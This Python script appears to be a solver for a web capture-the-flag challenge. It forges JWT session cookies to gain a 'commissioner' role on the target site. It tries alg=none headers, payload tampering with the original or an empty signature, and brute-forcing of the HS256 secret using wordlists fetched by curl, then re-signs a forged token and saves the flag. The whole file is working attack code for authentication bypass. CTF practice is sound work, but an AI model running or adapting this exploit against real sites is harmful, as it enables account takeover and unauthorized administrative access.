#!/usr/bin/env python3
import base64, hmac, hashlib, json, re, subprocess, sys, time
import urllib.request, urllib.error

BASE = "https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com"

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def b64ud(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

def req(path, cookie=None):
    r = urllib.request.Request(BASE + path)
    r.add_header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) solve")
    if cookie:
        r.add_header("Cookie", cookie)
    try:
        resp = urllib.request.urlopen(r, timeout=40)
        return resp.status, dict(resp.getheaders()), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "replace")

BAD = ("document", "function", "window", "var ", "=>", "createElement", "__CF")

def find_flag(body):
    cands = re.findall(r"[A-Za-z0-9_]{2,15}\{[^}\r\n]{2,160}\}", body)
    for c in cands:
        if not any(b in c for b in BAD):
            return c
    return None

def is_denied(body):
    return ("Commissioner access only" in body) or ("403 -" in body) or ("league role is" in body)

def show(label, st, body):
    denied = is_denied(body)
    flag = find_flag(body)
    print(f"\n===== {label} =====")
    print(f"status={st} denied={denied} len={len(body)} FLAG={flag}")
    txt = re.sub(r"<script[\s\S]*?</script>", " ", body, flags=re.I)
    txt = re.sub(r"<[^>]+>", " ", txt)
    txt = re.sub(r"\s+", " ", txt).strip()
    print("BODY:", txt[:1500])
    if not denied:
        print("!!!!! ACCESS GRANTED (not the 403 page) !!!!!")
        print("FULL_BODY_START")
        print(body[:4000])
        print("FULL_BODY_END")
    return flag if (flag and not denied) else None

# ---- 1. Get a fresh member session token ----
st, h, body = req("/")
setck = h.get("Set-Cookie", "")
print("Homepage status:", st)
print("Set-Cookie:", setck[:300])
m = re.search(r"wo_session=([^;]+)", setck)
member = m.group(1) if m else None
print("member token:", member)
assert member, "no session token issued"
H, P, S = member.split(".")
hdr = json.loads(b64ud(H)); pay = json.loads(b64ud(P))
print("header:", hdr)
print("payload:", pay)

found_flag = None

granted = []
def try_cookie(token, label):
    global found_flag
    st, h, body = req("/commissioner", cookie=f"wo_session={token}")
    f = show(label, st, body)
    if not is_denied(body):
        granted.append((label, token, body))
        found_flag = f or found_flag or "GRANTED-see-body"
    return body

# ---- Attempt A: alg=none ----
for algn in ["none", "None", "NONE", "nOnE"]:
    header = {"alg": algn, "typ": "JWT"}
    p = dict(pay); p["role"] = "commissioner"
    tok = f"{b64u(json.dumps(header,separators=(',',':')))}.{b64u(json.dumps(p,separators=(',',':')))}."
    try_cookie(tok, f"A-alg-{algn}")
    if found_flag: break

# ---- Attempt B: tamper payload, keep original header + signature (jwt.decode / no verify) ----
if not found_flag:
    p = dict(pay); p["role"] = "commissioner"
    newP = b64u(json.dumps(p, separators=(",", ":")))
    try_cookie(f"{H}.{newP}.{S}", "B-keep-original-signature")
    if not found_flag:
        try_cookie(f"{H}.{newP}.", "B-empty-signature")
    if not found_flag:
        # role variants
        for rv in ["commish", "admin", "owner", "COMMISSIONER", "Commissioner"]:
            p2 = dict(pay); p2["role"] = rv
            np = b64u(json.dumps(p2, separators=(",", ":")))
            try_cookie(f"{H}.{np}.{S}", f"B-role-{rv}")
            if found_flag: break

# ---- Attempt C: brute-force the HS256 secret ----
if not found_flag:
    signing = f"{H}.{P}".encode()
    want = b64ud(S)
    words = []
    base_words = ["secret","changeme","password","your-256-bit-secret","supersecret",
        "worldoutter","WorldOutter","commissioner","fantasy","football","gridiron",
        "gophers","league","dynasty","founders","ppr","keyboard cat","jwtsecret",
        "jwt-secret","secretkey","wo_session","wo_secret","webverselabs","node","express"]
    words += base_words
    # download known secret/word lists (runner has full internet)
    urls = [
        "https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt",
    ]
    for u in urls:
        try:
            subprocess.run(["curl","-sSL","--max-time","90","-o","/tmp/wl.txt",u], check=False)
            with open("/tmp/wl.txt","r",encoding="utf-8",errors="ignore") as fh:
                cnt=0
                for line in fh:
                    words.append(line.rstrip("\r\n")); cnt+=1
            print(f"loaded {cnt} words from {u}")
        except Exception as e:
            print("wordlist load fail", u, e)
    # try rockyou via a mirror release, capped
    try:
        subprocess.run(["curl","-sSL","--max-time","120","-o","/tmp/rockyou.txt",
            "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"], check=False)
        with open("/tmp/rockyou.txt","r",encoding="utf-8",errors="ignore") as fh:
            for i,line in enumerate(fh):
                if i>4000000: break
                words.append(line.rstrip("\r\n"))
        print("rockyou loaded")
    except Exception as e:
        print("rockyou fail", e)

    print(f"brute forcing over {len(words)} candidates...")
    secret=None; seen=set(); t0=time.time()
    for w in words:
        if w in seen: continue
        seen.add(w)
        if hmac.new(w.encode("utf-8","ignore"), signing, hashlib.sha256).digest()==want:
            secret=w; break
    print(f"brute done in {time.time()-t0:.1f}s, unique={len(seen)}")
    print("SECRET:", repr(secret))
    if secret is not None:
        p = dict(pay); p["role"]="commissioner"
        h_=b64u(json.dumps(hdr,separators=(',',':')))
        p_=b64u(json.dumps(p,separators=(',',':')))
        sig=b64u(hmac.new(secret.encode(), f"{h_}.{p_}".encode(), hashlib.sha256).digest())
        try_cookie(f"{h_}.{p_}.{sig}", "C-cracked-commissioner")

print("\n==================== RESULT ====================")
print("FLAG:", found_flag)
with open("flag.txt","w") as f:
    f.write(str(found_flag) + "\n")
